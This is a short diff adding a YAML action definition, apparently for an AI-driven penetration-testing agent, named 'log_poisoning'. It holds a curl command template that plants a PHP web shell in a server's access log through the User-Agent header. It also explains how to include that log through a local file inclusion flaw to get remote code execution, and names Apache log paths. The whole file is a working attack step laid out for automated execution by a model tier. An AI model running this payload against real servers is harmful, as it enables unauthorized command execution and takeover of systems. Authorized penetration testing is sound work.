@@ -1,0 +1,16 @@
+name: log_poisoning
+category: web
+description: Log poisoning for LFI-to-RCE
+preconditions:
+  - service.port==80
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: "curl -s '{target_url}' -H 'User-Agent: <?php system($_GET["cmd"]); ?>'"
+parser: null
+expected_effects:
+  - action_completed
+falsifier:
+  pattern: "error|failed|refused|denied"
+  timeout: 30
+model_tier: haiku
+mechanism: "Inject PHP code into log file (access.log, error.log, mail.log), then include via LFI. Requires: LFI vulnerability + writable log path. Apache: /var/log/apache2/access.log."
